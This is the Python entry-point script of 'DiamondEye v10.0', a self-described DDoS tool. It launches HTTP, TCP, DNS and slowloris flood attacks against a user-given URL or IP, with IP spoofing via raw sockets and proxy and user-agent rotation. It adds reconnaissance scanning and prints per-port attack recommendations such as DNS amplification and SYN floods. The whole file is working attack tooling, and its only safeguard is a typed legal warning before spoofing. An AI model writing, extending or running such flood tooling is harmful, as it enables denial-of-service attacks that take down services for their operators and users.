#!/usr/bin/env python3
# main.py
import asyncio
import sys
import os
import socket
import json
import logging
import time
from urllib.parse import urlparse
from datetime import datetime

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    print("\033[96m⚡ uvloop activated — speed boost enabled\033[0m")
except ImportError:
    print("\033[93mℹ️  uvloop not available — using default asyncio\033[0m")

try:
    import matplotlib.pyplot as plt
    MATPLOTLIB_AVAILABLE = True
except ImportError:
    MATPLOTLIB_AVAILABLE = False

from args import parse_args
from core.attack_manager import AttackManager
from plugins.secure_plugin_manager import SecurePluginManager
from recon.scanner import ReconScanner, quick_recon
from colorama import Fore, Style, init
from utils import load_useragents_from_file, load_http_methods
from recon.wayback import WaybackMachine
from recon.crt import CertificateTransparency
 
init(autoreset=True)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('diamondeye')


def load_useragents(filepath: str) -> list:
    """Загрузка User-Agent'ов из файла."""
    return load_useragents_from_file(filepath)


def parse_methods(raw: str) -> list:
    ALL_METHODS = load_http_methods()
    if not raw:
        return ['GET']
    if raw.upper() == 'ALL':
        return ALL_METHODS
    return [m.strip().upper() for m in raw.split(',') 
            if m.strip().upper() in ALL_METHODS]


def validate_target(args):
    if args.attack_type == 'http' and not args.url and not args.recon:
        logger.error("URL is required for HTTP attack")
        return False
    
    if args.attack_type in ['tcp', 'dns', 'slowloris']:
        if not args.target_ip and not args.url:
            logger.error(f"Target IP or URL is required for {args.attack_type} attack")
            return False
        
        if args.url and not args.target_ip:
            try:
                parsed = urlparse(args.url)
                hostname = parsed.hostname
                if hostname:
                    args.target_ip = socket.gethostbyname(hostname)
                    logger.info(f"Resolved {hostname} to {args.target_ip}")
            except (socket.gaierror, ValueError) as e:
                logger.error(f"Failed to resolve hostname: {e}")
                return False
            except Exception as e:
                logger.error(f"Unexpected error during resolution: {e}")
                return False
    
    if args.url and not args.recon:
        try:
            parsed = urlparse(args.url)
            if not parsed.scheme or not parsed.netloc:
                logger.error(f"Invalid URL: {args.url}")
                return False
        except Exception as e:
            logger.error(f"URL parse error: {e}")
            return False
    
    return True


def check_dependencies():
    missing_deps = []
    try:
        import aiohttp
    except ImportError:
        missing_deps.append("aiohttp")
    try:
        import httpx
    except ImportError:
        missing_deps.append("httpx")
    try:
        import psutil
    except ImportError:
        missing_deps.append("psutil")
    try:
        import dns.resolver
    except ImportError:
        missing_deps.append("dnspython")
    if missing_deps:
        print(f"{Fore.RED}❌ Missing dependencies: {', '.join(missing_deps)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 Install with: pip install {' '.join(missing_deps)}{Style.RESET_ALL}")
        return False
    return True


def print_banner():
    banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║                     DiamondEye v10.0                         ║
║         Advanced Multi-Layer DDoS & Security Tool            ║
║            Plugin System | Reconnaissance | Proxy            ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
    print(banner)


def print_legal_warning(args):
    if args.spoof_ip:
        print(f"{Fore.RED}{'!'*70}{Style.RESET_ALL}")
        print(f"{Fore.RED}⚠️  WARNING: IP SPOOFING DETECTED{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}IP spoofing without explicit permission is ILLEGAL in most jurisdictions.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}This technique can only be used on systems you own or have written authorization to test.{Style.RESET_ALL}")
        print(f"{Fore.RED}{'!'*70}{Style.RESET_ALL}")
        if not args.confirm_illegal:
            response = input(f"{Fore.YELLOW}Type 'I UNDERSTAND' to continue: {Style.RESET_ALL}")
            if response.strip().upper() != 'I UNDERSTAND':
                print(f"{Fore.RED}Exiting.{Style.RESET_ALL}")
                sys.exit(1)


async def handle_plugins(args):
    plugin_manager = SecurePluginManager(
        verify_signatures=not args.disable_plugin_verification
    )
    
    if args.add_plugin:
        print(f"{Fore.CYAN}📦 Adding plugin: {args.add_plugin}{Style.RESET_ALL}")
        await plugin_manager.load_allowed_hashes()
        success = await plugin_manager.add_plugin(args.add_plugin, force=args.force_add)
        return success
    
    if args.list_plugins:
        print(f"{Fore.CYAN}📦 Available plugins:{Style.RESET_ALL}")
        await plugin_manager.discover_plugins()
        for plugin_info in plugin_manager.list_plugins():
            print(f"\n{Fore.GREEN}{plugin_info.name} v{plugin_info.version}{Style.RESET_ALL}")
            print(f"  Author: {plugin_info.author}")
            print(f"  Description: {plugin_info.description}")
            print(f"  Attack types: {', '.join(plugin_info.attack_types)}")
        return True
    
    elif args.plugin:
        print(f"{Fore.CYAN}🚀 Executing plugin: {args.plugin}{Style.RESET_ALL}")
        await plugin_manager.discover_plugins()
        plugin = plugin_manager.get_plugin(args.plugin)
        if not plugin:
            logger.error(f"Plugin '{args.plugin}' not found")
            available = ', '.join(plugin_manager.plugins.keys())
            print(f"{Fore.YELLOW}💡 Available plugins: {available}{Style.RESET_ALL}")
            return False
        plugin_config = {}
        if args.plugin_config:
            try:
                with open(args.plugin_config, 'r', encoding='utf-8') as f:
                    plugin_config = json.load(f)
            except (FileNotFoundError, json.JSONDecodeError) as e:
                logger.error(f"Failed to load plugin config: {e}")
        base_config = {
            'target': args.url or args.target_ip,
            'workers': args.workers,
            'sockets': args.sockets,
            'debug': args.debug,
            'attack_type': args.attack_type,
            'duration': args.duration
        }
        plugin_config.update(base_config)
        try:
            await plugin.initialize(plugin_config)
            logger.info(f"Plugin initialized successfully")
            start_time = time.time()
            result = await plugin.execute(plugin_config['target'], duration=args.duration)
            duration = time.time() - start_time
            print(f"\n{Fore.GREEN}✅ Plugin execution completed in {duration:.1f}s{Style.RESET_ALL}")
            print(f"{Fore.CYAN}📊 Results:{Style.RESET_ALL}")
            for key, value in result.items():
                if isinstance(value, dict):
                    print(f"  {key}:")
                    for k, v in value.items():
                        print(f"    {k}: {v}")
                else:
                    print(f"  {key}: {value}")
            await plugin.cleanup()
            return True
        except Exception as e:
            logger.error(f"Plugin execution failed: {e}", exc_info=args.debug)
            return False
    
    return False


async def handle_recon(args):
    target = args.url or args.target_ip
    if not target:
        logger.error("Target required for reconnaissance")
        return False
    
    print(f"{Fore.CYAN}🎯 Starting reconnaissance on {target}{Style.RESET_ALL}")
    
    ports_to_scan = None
    if not args.all_ports and args.recon_ports:
        ports_to_scan = []
        for part in args.recon_ports.split(','):
            part = part.strip()
            if '-' in part:
                try:
                    start, end = map(int, part.split('-'))
                    ports_to_scan.extend(range(start, end + 1))
                except ValueError:
                    logger.warning(f"Invalid port range: {part}")
            else:
                try:
                    ports_to_scan.append(int(part))
                except ValueError:
                    logger.warning(f"Invalid port number: {part}")
    
    try:
        results = await quick_recon(
            target,
            all_ports=args.all_ports,
            ports_list=ports_to_scan,
            wayback=getattr(args, 'wayback', False),
            crt=getattr(args, 'crt', False),
            syn_scan=getattr(args, 'syn_scan', False)
        )
        
        filename = args.recon_save or f"recon_{target.replace('://', '_').replace('/', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, default=str)
        print(f"{Fore.GREEN}✅ JSON report saved to {filename}{Style.RESET_ALL}")
        
        return True
    except Exception as e:
        logger.error(f"Reconnaissance failed: {e}", exc_info=args.debug)
        return False


def generate_text_report(results: dict) -> str:
    """Generate text report from recon results."""
    report = []
    report.append("=" * 60)
    report.append(f"RECONNAISSANCE REPORT - {results.get('target', 'Unknown')}")
    report.append("=" * 60)
    report.append(f"Scan time: {results.get('timestamp', 'N/A')}")
    report.append(f"Duration: {results.get('scan_duration', 0):.2f}s")
    report.append("")
    
    if results.get('waf'):
        report.append(f"[WAF] Detected: {results['waf'].upper()}")
        report.append("")
    
    if results.get('dns_records'):
        report.append("[DNS Records]")
        for rtype, values in results['dns_records'].items():
            if values:
                report.append(f"  {rtype}: {', '.join(values)}")
        report.append("")
    
    if results.get('ports'):
        report.append("[Open Ports]")
        for port in sorted(results['ports']):
            service = results['services'].get(port)
            if service:
                banner = f" - {service.banner}" if hasattr(service, 'banner') and service.banner else ""
                title = f" [{service.http_title}]" if hasattr(service, 'http_title') and service.http_title else ""
                report.append(f"  {port}: {service.service}{banner}{title}")
        report.append("")
    
    if results.get('subdomains'):
        report.append("[Subdomains]")
        for sub in results['subdomains']:
            if isinstance(sub, dict):
                report.append(f"  {sub['subdomain']} -> {sub.get('ip', '?')} [{sub.get('source', 'dns')}]")
            else:
                report.append(f"  {sub}")
        report.append("")
    
    if results.get('wayback_urls'):
        report.append(f"[Wayback Machine] {len(results['wayback_urls'])} URLs")
        for url in list(results['wayback_urls'])[:20]:
            report.append(f"  {url}")
        if len(results['wayback_urls']) > 20:
            report.append(f"  ... and {len(results['wayback_urls']) - 20} more")
        report.append("")
    
    if results.get('sensitive_files'):
        report.append("[Sensitive Files]")
        for f in results['sensitive_files']:
            report.append(f"  {f['path']} ({f['status']})")
        report.append("")
    
    if results.get('technologies'):
        report.append("[Technologies]")
        for tech in sorted(results['technologies']):
            report.append(f"  {tech}")
        report.append("")
    
    if results.get('vulnerabilities'):
        report.append("[Vulnerabilities]")
        for v in results['vulnerabilities']:
            report.append(f"  {v['type']} ({v['severity']}): {v.get('description', '')}")
        report.append("")
    
    report.append("=" * 60)
    return '\n'.join(report)


async def generate_attack_recommendations(recon_data: dict):
    print(f"\n{Fore.CYAN}🎯 Attack Recommendations:{Style.RESET_ALL}")
    recommendations = []
    open_ports = []
    if 'port_scan' in recon_data:
        open_ports = recon_data['port_scan'].get('open_ports', [])
        services = recon_data.get('services', {})
        for port in open_ports:
            service = services.get(port, '').lower()
            if port in (80, 443) or 'http' in service:
                proto = 'https' if port == 443 else 'http'
                recommendations.append(f"  • Port {port} (HTTP{'S' if port==443 else ''}): Use Layer7 attack")
            elif port == 53 or 'dns' in service:
                recommendations.append(f"  • Port {port} (DNS): DNS amplification attack")
            elif port == 22 or 'ssh' in service:
                recommendations.append(f"  • Port {port} (SSH): TCP SYN flood")
            elif port == 3306 or 'mysql' in service:
                recommendations.append(f"  • Port {port} (MySQL): Connection exhaustion")
    if 'ssl_info' in recon_data and recon_data['ssl_info'].get('supported'):
        recommendations.append("  • SSL/TLS detected: Consider using --http2")
    if recommendations:
        for rec in recommendations:
            print(rec)
    else:
        print(f"  {Fore.YELLOW}No specific recommendations")


async def main():
    try:
        args = parse_args()
        if len(sys.argv) == 1:
            return
        if not check_dependencies():
            sys.exit(1)
        print_banner()
        print_legal_warning(args)
        
        if args.list_plugins or args.plugin:
            await handle_plugins(args)
            return
        
        if args.recon:
            await handle_recon(args)
            return
        
        if not validate_target(args):
            sys.exit(1)
        
        if args.http2 and args.extreme:
            logger.warning("--http2 incompatible with --extreme — disabling http2")
            args.http2 = False
        if args.http3 and args.extreme:
            logger.warning("--http3 incompatible with --extreme — disabling http3")
            args.http3 = False
        if args.flood and args.slow > 0:
            logger.warning("--flood disables --slow — modes conflict")
            args.slow = 0.0
        if args.header_flood and not args.junk:
            logger.warning("--header-flood requires --junk — enabling junk headers")
            args.junk = True
        
        if args.attack_type in ['tcp', 'dns'] and args.spoof_ip:
            try:
                test_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                test_sock.close()
            except PermissionError:
                logger.warning("IP spoofing requires root/admin privileges — running without spoofing")
                args.spoof_ip = False
        
        useragents = []
        if args.useragents:
            useragents = load_useragents(args.useragents)
        elif args.rotate_ua:
            useragents = load_useragents_from_file()
        
        if args.url:
            parsed = urlparse(args.url)
            netloc = parsed.netloc.lower()
            if netloc.startswith(('127.', 'localhost', '0.0.0.0')):
                useragents.append("CTF-Scanner/10.0")
                useragents.append("Mozilla/5.0 (X11; Linux x86_64) DiamondEye-Mode")
        args.useragents = useragents
        args.methods = parse_methods(args.methods)
        
        if args.url:
            parsed = urlparse(args.url)
            netloc = parsed.netloc.lower()
            if netloc.startswith(('127.', 'localhost', '0.0.0.0')):
                max_workers = max(1, os.cpu_count() * 4)
                if args.workers > max_workers:
                    logger.info(f"Localhost: workers limited to {max_workers}")
                    args.workers = max_workers
        
        print(f"{Fore.CYAN}⚙️  Configuration:{Style.RESET_ALL}")
        print(f"  Attack Type: {args.attack_type.upper()}")
        print(f"  Workers: {args.workers} ({args.sockets} sockets each)")
        if args.url:
            print(f"  Target: {args.url}")
        elif args.target_ip:
            print(f"  Target: {args.target_ip}:{args.target_port}")
        if args.duration > 0:
            print(f"  Duration: {args.duration}s")
        if args.proxy_auto or args.proxy_file:
            print(f"  Proxy: Auto-enabled")
        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        attack_manager = AttackManager(args)
        if not await attack_manager.initialize():
            logger.error("Failed to initialize attack manager")
            sys.exit(1)
        
        start_time = time.time()
        try:
            await attack_manager.start_attack()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}🛑 Attack interrupted by user{Style.RESET_ALL}")
        except asyncio.CancelledError:
            print(f"\n{Fore.YELLOW}🛑 Attack cancelled{Style.RESET_ALL}")
        except Exception as e:
            logger.error(f"Fatal error: {e}", exc_info=args.debug)
        finally:
            await attack_manager.stop_attack()
            duration = time.time() - start_time
            print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}✅ Attack completed{Style.RESET_ALL}")
            print(f"{Fore.CYAN}⏱️  Total duration: {duration:.1f}s{Style.RESET_ALL}")
            if attack_manager.resource_monitor:
                attack_manager.resource_monitor.print_final_report()
            if args.plot and MATPLOTLIB_AVAILABLE:
                save_plot(attack_manager, args.plot)
            print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    except Exception as e:
        logger.critical(f"Critical error: {e}", exc_info=True)
        sys.exit(1)


def save_plot(attack_manager, filepath):
    if not attack_manager.stats.get('rps_history'):
        return
    try:
        times = [p['time'] for p in attack_manager.stats['rps_history']]
        rps = [p['rps'] for p in attack_manager.stats['rps_history']]
        plt.figure(figsize=(12, 6))
        plt.subplot(2, 1, 1)
        plt.plot(times, rps, color='red', linewidth=1.5)
        plt.xlabel('Time (s)')
        plt.ylabel('Requests/Sec')
        plt.title('DiamondEye v10.0 - RPS over Time')
        plt.grid(True, alpha=0.3)
        if attack_manager.resource_monitor and attack_manager.resource_monitor.network_history:
            net_times = []
            net_mbps = []
            for i, h in enumerate(attack_manager.resource_monitor.network_history):
                net_times.append(i)
                sent_mbps = (h['sent_bytes'] * 8) / 1024 / 1024
                net_mbps.append(sent_mbps)
            plt.subplot(2, 1, 2)
            plt.plot(net_times, net_mbps, color='blue', linewidth=1.5)
            plt.xlabel('Time (samples)')
            plt.ylabel('Bandwidth (Mbps)')
            plt.title('Network Bandwidth Usage')
            plt.grid(True, alpha=0.3)
        plt.tight_layout()
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        plt.savefig(filepath, dpi=150)
        plt.close()
        logger.info(f"Plot saved: {filepath}")
    except Exception as e:
        logger.error(f"Plot error: {e}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}🛑 DiamondEye stopped{Style.RESET_ALL}")
    except Exception as e:
        logger.critical(f"Critical error: {e}", exc_info=True)
        sys.exit(1)
